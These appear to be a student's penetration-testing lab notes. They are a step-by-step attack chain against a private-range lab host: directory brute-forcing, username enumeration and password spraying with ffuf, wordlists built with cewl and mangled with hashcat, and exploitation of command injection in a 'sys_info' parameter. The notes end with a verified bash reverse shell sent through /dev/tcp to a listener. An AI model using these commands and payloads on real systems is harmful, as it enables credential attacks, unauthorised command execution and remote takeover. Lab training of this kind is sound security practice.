

##forced browse
gobuster dir --wordlist /usr/share/wordlists/dirb/common.txt --url http://192.168.181.121/


##enumerate users:
ffuf -w users.txt -u http://enum-sandbox/auth/login -X POST -d 'username=FUZZ&password=bar' -H 'Content-Type: application/x-www-form-urlencoded'

password spray

/usr/share/seclists/Passwords/Common-Credentials

ffuf -w ~/web200/labs/bambi/users.txt:USER -w top-20-common-SSH-passwords.txt:PASS \
  -u http://192.168.181.121/dev/index.php \
  -X POST \
  -d 'username=USER&password=PASS' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -fr "Incorrect Password for User" 


the filter -fr is the actual message the server gives back for incorrect passwords



##if none of the password lists work try using cewl on the website to find all the words on the site -2 will go two pages deep

cewl http://192.168.181.121/ -d 2 -w custom_wordlist1.txt

##then
ffuf -w ~/web200/labs/bambi/users.txt:USER -w custom_wordlist1.txt:PASS \
  -u http://192.168.181.121/dev/index.php \
  -X POST \
  -d 'username=USER&password=PASS' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -fr "Incorrect Password for User"



##Since passwords are often a word + number/symbol combo, consider running the raw CeWL output through a mangler like Hashcat rules or simple John the Ripper word-mangling rules to generate variations (capitalization, appended numbers, special chars):

hashcat --force --stdout custom_wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mangled_wordlist.txt


found command injection on a parameter - |whoami showed www-data on the page 

now with command injection confirmed begin recon:

|id
|hostname
|pwd
|ls -la /
|ls -la /home
|ls -la /var/www

## search for file
|find / -name "local.txt" 2>/dev/null
##read file
|cat /var/www/local.txt

|sudo -l


##original working request from burp:
POST /dev/admin.php HTTP/1.1
Host: 192.168.181.121
...SNIP...
Referer: http://192.168.181.121/dev/admin.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=9b5888818e95f56ad058923ee9c38be9
Connection: keep-alive

sys_info=-h|ls

##user a reverse shell
##basic curl first
curl -s "http://192.168.181.121/dev/admin.php" \
  -H "Cookie: PHPSESSID=9b5888818e95f56ad058923ee9c38be9" \
  --data-urlencode "sys_info=-h|whoami"
  
  
##start listener
nc -nlvp 9090
##verified works
  curl -s "http://192.168.181.121/dev/admin.php" \
  -H "Cookie: PHPSESSID=9b5888818e95f56ad058923ee9c38be9" \
  --data-urlencode "sys_info=-h|bash -c 'bash -i >& /dev/tcp/192.168.45.196/9090 0>&1'"
